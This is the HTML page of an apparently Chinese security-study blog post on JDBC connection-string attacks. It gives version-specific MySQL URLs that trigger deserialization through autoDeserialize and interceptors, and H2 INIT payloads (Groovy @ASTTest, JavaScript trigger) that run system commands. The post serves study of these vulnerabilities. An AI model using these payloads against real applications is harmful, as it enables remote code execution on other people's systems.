@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>JDBC学习 - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="JDBC学习 - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/03/28/JDBC%E5%AD%A6%E4%B9%A0/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-03-27T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-03-28T00:00:00+08:00">
+      March 28, 2025
+    </time>
+    
+
+    <h1 class="title">JDBC学习</h1>
+  </div>
+
+  <div class="content">
+    <h2 id="外部库添加技巧"><a href="#外部库添加技巧" class="headerlink" title="外部库添加技巧"></a>外部库添加技巧</h2><p>如果是spring的jar包，要将BOOT-INF&#x2F;classes添加到库里边，这样才能成功导入classes的类</p>
+<p>对jar包进行调试的时候不能把断点打到注解上，不然打了跟没打效果是一样的</p>
+<p>破案了，以后将文件夹添加为外部库时记得不要直接用jar包中的文件夹，要先将jar包解压，再用解压后的文件夹</p>
+<p><a target="_blank" rel="noopener" href="https://e1bwsnq803k.feishu.cn/docx/JvHrd8hIiom4WIxxYAMcD74snWh">java2</a></p>
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc&quot;</span>;<span class="comment">//8.x使用</span></span><br><span class="line">        <span class="comment">//String DB_URL = &quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc&quot;;//5.x使用</span></span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是java连接mysql数据库的语句。可以看到DB_URL中有三个拓展参数autoDeserialize,queryInterceptors,user</p>
+<p>queryInterceptors参数需要的是实现了com.mysql.cj.interceptors.QueryInterceptor接口的类，</p>
+<h3 id="ServerStatusDiffInceptor-5-11以下无法通过连接触发，5-x、6-x要注意Inceptors的接收参数为statmentInterceptors"><a href="#ServerStatusDiffInceptor-5-11以下无法通过连接触发，5-x、6-x要注意Inceptors的接收参数为statmentInterceptors" class="headerlink" title="ServerStatusDiffInceptor(5.11以下无法通过连接触发，5.x、6.x要注意Inceptors的接收参数为statmentInterceptors)"></a>ServerStatusDiffInceptor(5.11以下无法通过连接触发，<strong>5.x、6.x要注意Inceptors的接收参数为statmentInterceptors</strong>)</h3><p>Connector包从6.0开始从com.mysql变成了com.mysql.cj,所以ServerStatusDiffInterceptor类的位置也有所变化</p>
+<p>我们这里设置的是ServerStatusDiffInterceptor,服务器接受的查询语句先交由这个类处理。当服务器接收到SQL Query时就会调用这个interceptors的preProcess方法，此方法调用了populateMapWithSessionStatusValues()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MmYzNmNkMWQ2YTM0NmMwN2ZlNjJjNTAzNmYxZjYwYWFfTTJhUGxqbjFLQXBVcUpjZXJJaVA0dXRxalU2aUJ0QWpfVG9rZW46QW5lM2I1bk44b1htV2h4WWR6SGN0bzhNbnhkXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>执行了SHOW SESSION STATUS语句并获取了结果集rs</p>
+<p>跟进resultSetToMap()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NmZGIzNWM5OWE3YzRlZDMyOWVkMTNiYzIzYTcyY2FfaUhxUEc2VjA1SUcxaWRGSnhHMjh2SlBGZVdSd2tmd1FfVG9rZW46RjRXUGJVdGJEb1lzcGR4endZdmM5ZDh5bmp1XzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>ResultSetImpl::getObject(),当Mysql字段类型为blob时反序列化数据，所以只要保证rs这个结果集中1，2栏保存了反序列化的数据即可</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTJhZTE3NzZiMGFlN2NlNWI0YmExNTgzMTA4MTQwMjRfZzRrbmNsbUNXRUIwSUZteE40MTFNZk9kSVhjSGZHVDdfVG9rZW46TmVMTWJvZDBwbzRQaEx4eVd5cmNZUHVKbmtiXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>注意此时我们在DB_URL中设置的拓展参数autoDeserialize&#x3D;ture在此时派上了用场，必须为ture才能执行反序列化。</p>
+<p>为什么第一张图在对数据库进行连接的时候明明没有发送SQL Query语句却触发了interceptor呢？</p>
+<p>因为在getConnection过程中，会触发<code>SET NAMES utf</code>、<code>set autocommit=1</code>一类的请求，这一类的请求其实也会被处理为SQL Query,所以会触发我们所配置的queryInterceptors。</p>
+<p><strong>ServerStatusDiffInterceptor触发：用户名是基于MySQL Fake Server工具的，具体使用中请自行修改。</strong></p>
+<p><strong>8.x:</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></p>
+<p><strong>6.x(属性名不同):</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></p>
+<p><strong>5.1.11及以上的5.x版本（包名没有了cj）:</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></p>
+<p>**5.1.10及以下的5.1.X版本：**同上，但是需要连接后执行查询。</p>
+<p>**5.0.x:**还没有<code>ServerStatusDiffInterceptor</code>这个东西┓( ´∀&#96; )┏</p>
+<h3 id="detectCustomCollations-只能在5-1-19-5-1-41版本触发"><a href="#detectCustomCollations-只能在5-1-19-5-1-41版本触发" class="headerlink" title="detectCustomCollations(只能在5.1.19-5.1.41版本触发)"></a>detectCustomCollations(只能在5.1.19-5.1.41版本触发)</h3><p>触发点在<code>com.mysql.jdbc.ConnectionImpl</code>的<code>buildCollationMapping</code>方法中：</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzJjMDdjNDRmN2YzNjY1NmMxNWJkMTZlMzdjM2UwNzNfTW9VUUlON1pFT1VCUktzZUY1UjNzdGtRdjhzSmVWeGZfVG9rZW46SFRDdWI0Wjh0bzVMQmt4Rlc1WmM2MDIyblNiXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NjJlOGJmMDU4YjJmYjQ2NmNlYzg2MGM2ZGIzOWQ1ZDNfbjRVdThHTjB4VVE5VkZjQng4cVlDVWFweHAzSkFpWHFfVG9rZW46SFpEdWJHa2oyb3pLSWd4ZkxGZGNORUg0bmRkXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>此处只需要字段2或3为BLOB装载我们的序列化数据即可。</p>
+<p><strong>detectCustomCollations触发：</strong></p>
+<p>**5.1.41及以上:**不可用</p>
+<p><strong>5.1.29-5.1.40:</strong><code>jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</code></p>
+<p><strong>5.1.28-5.1.19：</strong><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</code></p>
+<p>**5.1.18以下的5.1.x版本：**不可用</p>
+<p><strong>5.0.x版本不可用</strong></p>
+<h2 id="H2-DataBase"><a href="#H2-DataBase" class="headerlink" title="H2 DataBase"></a>H2 DataBase</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1832/#h2-rce">https://paper.seebug.org/1832/#h2-rce</a></p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce">https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce</a></p>
+<p>h2引擎会在参数中拆分”INIT”参数，并使用CommandInterface的实现类来根据配置实现初始化数据库</p>
+<p>Sink 点在 <code>org.h2.engine.Engine#openSession</code></p>
+<h3 id="出网利用"><a href="#出网利用" class="headerlink" title="出网利用"></a>出网利用</h3><p>在本案例下，具体的处理类是 <code>org.h2.command.CommandContainer</code>。</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YjhiMzBkZTcyOGYzN2FmYmFkZTM4MzdmMThjODViMTJfMGtUWFFiS0EyQ2hRSDVjaUgxbmFoUjFETWlOdzdrT0VfVG9rZW46SkR0SGJNUldFb2NtTGl4VGtCQWNvMnFibkFkXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MjdlOWEzMDViOWE1ZTU1YTE2OWJlMDA4M2ExZWQ2NDhfeHNlNWhEY0lmOVU4U1VOMTVtTlFVb1Q0eTZ5RVJFc0JfVG9rZW46VEtQTmJzWW9vb2o4Y3B4U1ZZbWNVa2pNbm5hXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>因为session.prepareCommand只能处理一条语句，而我们的payload需要两条语句，第一条定义一个函数利用CREAETE ALIAS，第二条执行这个函数，所以我们要用RUNSCRIPT加载远程sql文件,这就需要出网了。</p>
+<h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><p>我们要想办法让payload只需要一条语句</p>
+<h4 id="源代码编译器的作用"><a href="#源代码编译器的作用" class="headerlink" title="源代码编译器的作用"></a>源代码编译器的作用</h4><p>作用是将sql中用户自定义的java方法(或其他脚本语言Groovy,javascript)动态编译成可执行的字节码或脚本逻辑。</p>
+<p>例如CREATE ALIAS exec AS $$ String chonger(String cmd){Rutime.getRuntime().exec(cmd);return “chonger”;}$$,识别出这是java语言后使用jdk内置的javax.tool.ToolProvider.getSystemJavaCompiler()编译成.class,这一过程类似于在java中使用javac命令。接着将编译后的字节码通过自定义的类加载器加载到jvm中，生成可调用的java类和方法。</p>
+<h4 id="不同编译器的差异"><a href="#不同编译器的差异" class="headerlink" title="不同编译器的差异"></a><strong>不同编译器的差异</strong></h4><p>H2 支持三种编译器，其处理方式有所不同：</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>处理方式</th>
+<th>使用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>java</td>
+<td>通过 JDK 编译器生成字节码</td>
+<td>高性能、需直接调用 Java 库的场景</td>
+</tr>
+<tr>
+<td>javascript</td>
+<td>使用 Rhino&#x2F;Nashorn 引擎解释执行</td>
+<td>快速原型开发、轻量级脚本逻辑</td>
+</tr>
+<tr>
+<td>Groovy</td>
+<td>通过 Groovy 解析器动态编译</td>
+<td>需要 Groovy 语法糖或 DSL 的场景</td>
+</tr>
+</tbody></table>
+<h4 id="Groovy-create-alias"><a href="#Groovy-create-alias" class="headerlink" title="Groovy+create alias"></a>Groovy+create alias</h4><p>在create alias的源代码中，发现sql中对于java方法的定义是交给源代码编译器处理的，有三种支持的编译器，Groovy,java,javascript.</p>
+<p>在org.h2.util.SourceCompiler#getClass方法中</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGFiNjFhNzQ0ZDRkOTQ0NzY2ZmM2Mzk4MTUzMjg2Njlfc1E0cXZlNHUxR2ZTNnRWejBNWkRwUTkySjVldkFVSjNfVG9rZW46WHppeWJReWNob3hmNmJ4TkhDdWM4ak52blVjXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YjAyNWI1ZGU2YWJlOGJlYjZhOTgzOGZlODFlOGU3YjRfczdSTnNnbDV6U2NIU2pza3BJZWRtUGN3Z0E1NzZmRHZfVG9rZW46VThKaWJ1Z2NOb1cwQkh4ckpsVGNXS2ZNbnVnXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>根据isGroovySource来判断是否为Groovy语句，如果为true，调用GroovyCompiler.parseClass</p>
+<h5 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h5><p>使用 <code>@groovy.transform.ASTTEST</code> 在 AST 中使用 assert 执行命令</p>
+<p>groovy的assert右侧的表达式可以包含任意可执行代码（包括方法调用），通过将命令嵌入@ASTTEST,可以在编译时触发恶意操作，例如</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ASTTest</span>(value=&#123;</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;touch /tmp/exploit&quot;</span>.execute() <span class="comment">// 执行系统命令</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="type">void</span> dummyMethod() &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行路径</strong>：</p>
+<ol>
+<li>编译器解析 <code>@ASTTest</code> 注解；</li>
+<li>执行 <code>value</code> 闭包内的 <code>assert</code> 表达式；</li>
+<li><code>&quot;touch ...&quot;.execute()</code> 调用系统 Shell 执行命令</li>
+</ol>
+<p>下方代码块是具体的jdbc exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">groovy</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;&quot;</span> + <span class="string">&quot; assert java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span> + <span class="string">&quot;&#125;)&quot;</span> + <span class="string">&quot;def x&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#x27;&quot;</span>+ groovy +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url);</span><br><span class="line">    conn.close();&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是groovy依赖不常见</p>
+<h4 id="javascript-CREATE-TRIGGER（java自带的Nashorn-JavaScript-引擎已经在java-15往后删除）"><a href="#javascript-CREATE-TRIGGER（java自带的Nashorn-JavaScript-引擎已经在java-15往后删除）" class="headerlink" title="javascript+CREATE TRIGGER（java自带的Nashorn JavaScript 引擎已经在java 15往后删除）"></a>javascript+CREATE TRIGGER（java自带的Nashorn JavaScript 引擎已经在java 15往后删除）</h4><p>这条链子不仅编译了源代码，还调用了eval</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZmNzFiYmFmZTk0NzIxNjA5YTc0OTk2ZDI0YzkxM2Vfb0FEcUVKTTdWbmtRbFR4alVCNGNVYlNVMkNNbUlycXhfVG9rZW46WUU5TmJ3d2Jib3B4Q254UWRWT2NQQ0FMbndmXzE3NzQxNTIxMjQ6MTc3NDE1NTcyNF9WNA" alt="img"></p>
+<p>exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">javascript</span> <span class="operator">=</span> <span class="string">&quot;//javascript\njava.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS &#x27;&quot;</span>+ javascript +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url);</span><br><span class="line">    conn.close();&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2025/04/10/%E9%98%BF%E9%87%8C%E4%BA%91CTF-EspressoCoffee/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">阿里云CTF-EspressoCoffee+Chain17复现</h3>
+      </div>
+    </a>
+    
+    <a class="prev"></a>
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
